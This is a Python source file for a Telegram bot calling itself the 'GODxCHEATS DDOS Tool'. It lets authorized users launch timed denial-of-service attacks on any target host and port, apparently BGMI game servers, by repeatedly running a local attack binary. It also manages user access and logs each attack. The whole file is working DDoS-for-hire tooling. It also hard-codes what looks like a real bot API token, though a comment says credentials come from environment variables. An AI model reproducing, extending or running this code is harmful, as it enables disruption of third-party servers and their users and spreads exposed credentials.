import telebot
import subprocess
import datetime
import time
import os
from keep_alive import keep_alive

# Start the keep_alive function to keep the bot running
keep_alive()

# Configuration - Use environment variables for security
API_TOKEN = '8016978575:AAHLJoMGe_wfAWY8_oo9OKJ3W4RwAotNlZU'
ADMIN_ID = ["1662672529"]  # Replace with your admin ID
USER_FILE = "users.txt"
LOG_FILE = "log.txt"
MAX_ATTACK_DURATION = 240  # 4 minutes maximum
COOLDOWN_TIME = 60  # 1 minute cooldown between attacks

# Initialize the bot
bot = telebot.TeleBot(API_TOKEN)

# Global dictionaries to manage cooldowns and expiry times
bgmi_cooldown = {}
user_approval_expiry = {}

# Helper Functions
def read_file(file_path):
    try:
        with open(file_path, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def write_file(file_path, data):
    with open(file_path, "a") as file:
        file.write(data + "\n")

def log_command(user_id, command, target=None, port=None, duration=None):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    try:
        user_info = bot.get_chat(user_id)
        username = f"@{user_info.username}" if user_info.username else f"UserID: {user_id}"
    except Exception:
        username = f"UserID: {user_id}"
    
    log_entry = f"[{timestamp}] {username} executed: {command}"
    if target: log_entry += f" | Target: {target}"
    if port: log_entry += f" | Port: {port}"
    if duration: log_entry += f" | Duration: {duration}s"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

def is_user_authorized(user_id):
    allowed_users = read_file(USER_FILE)
    return str(user_id) in allowed_users or str(user_id) in ADMIN_ID

def check_cooldown(user_id):
    if str(user_id) in ADMIN_ID:
        return False  # No cooldown for admin
    
    current_time = datetime.datetime.now()
    if user_id in bgmi_cooldown:
        elapsed = (current_time - bgmi_cooldown[user_id]).seconds
        if elapsed < COOLDOWN_TIME:
            return True  # Still in cooldown
    return False  # No cooldown or cooldown expired

# Attack Function with Progress
def run_attack_with_progress(bot, message, target, port, duration):
    try:
        # Input validation
        if not target or not port or not duration:
            raise ValueError("Missing required parameters")
        
        if duration > MAX_ATTACK_DURATION:
            raise ValueError(f"Duration exceeds maximum limit of {MAX_ATTACK_DURATION} seconds")

        # Send initial progress message
        progress_msg = bot.reply_to(message, 
                                  f"🚀 Starting attack on {target}:{port}\n"
                                  f"⏳ Duration: {duration} seconds\n"
                                  "Progress: [                    ] 0%")

        start_time = time.time()
        end_time = start_time + duration

        while time.time() < end_time:
            try:
                # Run the attack command with timeout
                subprocess.run(
                    ["./Rahul", target, str(port), str(duration), "900"],
                    timeout=1,
                    check=True
                )
            except subprocess.TimeoutExpired:
                pass  # Normal for long-running attacks

            # Update progress
            elapsed = time.time() - start_time
            progress = min(int((elapsed / duration) * 100), 100)
            bar = "█" * (progress // 5) + " " * (20 - (progress // 5))
            
            # Edit the progress message
            bot.edit_message_text(
                f"🚀 Attacking {target}:{port}\n"
                f"⏳ Time Left: {max(0, int(end_time - time.time()))}s\n"
                f"Progress: [{bar}] {progress}%",
                chat_id=message.chat.id,
                message_id=progress_msg.message_id
            )
            
            time.sleep(1)  # Update every second

        # Attack completed
        bot.edit_message_text(
            f"✅ Attack completed successfully!\n"
            f"🎯 Target: {target}:{port}\n"
            f"⏱️ Duration: {duration}s",
            chat_id=message.chat.id,
            message_id=progress_msg.message_id
        )

    except Exception as e:
        error_msg = f"❌ Attack failed: {str(e)}"
        bot.reply_to(message, error_msg)
        log_command(message.chat.id, "ATTACK_FAILED", target, port, duration)

# Command Handlers
@bot.message_handler(commands=['start'])
def send_welcome(message):
    welcome_text = '''
🔥 Welcome to GODxCHEATS DDOS Tool! 🔥

Available Commands:
/bgmi <target> <port> <duration> - Launch attack
/help - Show help information

⚠️ Note: This bot is for authorized users only!
'''
    bot.reply_to(message, welcome_text)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''
🤖 Available Commands:
/bgmi <target> <port> <duration> - Launch attack
/help - Show this help message

Admin Commands:
/add <user_id> <duration> - Add authorized user
/remove <user_id> - Remove user
/clearlogs - Clear attack logs
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    
    # Check authorization
    if not is_user_authorized(user_id):
        bot.reply_to(message, "❌ You are not authorized. Contact admin.")
        return
    
    # Check cooldown
    if check_cooldown(user_id):
        bot.reply_to(message, f"⏳ Please wait {COOLDOWN_TIME} seconds between attacks.")
        return
    
    # Parse command
    try:
        parts = message.text.split()
        if len(parts) != 4:
            raise ValueError("Invalid format. Use: /bgmi <target> <port> <duration>")
        
        target = parts[1]
        port = int(parts[2])
        duration = int(parts[3])
        
        if duration <= 0 or duration > MAX_ATTACK_DURATION:
            raise ValueError(f"Duration must be between 1-{MAX_ATTACK_DURATION} seconds")
        
        # Update cooldown
        bgmi_cooldown[user_id] = datetime.datetime.now()
        
        # Log and launch attack
        log_command(user_id, "/bgmi", target, port, duration)
        run_attack_with_progress(bot, message, target, port, duration)
        
    except ValueError as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")
    except Exception as e:
        bot.reply_to(message, f"❌ Unexpected error: {str(e)}")
        log_command(user_id, "BGMI_ERROR", error=str(e))

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_ID:
        bot.reply_to(message, "❌ Admin access required.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 3:
            raise ValueError("Format: /add <user_id> <duration_in_seconds>")
        
        new_user = parts[1]
        duration = int(parts[2])
        
        if duration <= 0:
            raise ValueError("Duration must be positive")
        
        # Add user to file
        write_file(USER_FILE, new_user)
        
        # Set expiry (optional)
        expiry = datetime.datetime.now() + datetime.timedelta(seconds=duration)
        user_approval_expiry[new_user] = expiry
        
        bot.reply_to(message, f"✅ User {new_user} added successfully!\n"
                             f"⏳ Access expires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
        
    except ValueError as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id not in ADMIN_ID:
        bot.reply_to(message, "❌ Admin access required.")
        return
    
    try:
        parts = message.text.split()
        if len(parts) < 2:
            raise ValueError("Format: /remove <user_id>")
        
        target_user = parts[1]
        users = read_file(USER_FILE)
        
        if target_user not in users:
            raise ValueError("User not found in authorized list")
        
        # Remove user
        users.remove(target_user)
        with open(USER_FILE, "w") as f:
            f.write("\n".join(users))
        
        bot.reply_to(message, f"✅ User {target_user} removed successfully.")
        
    except ValueError as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# Start the bot
if __name__ == "__main__":
    print("Bot is running...")
    bot.polling(none_stop=True)
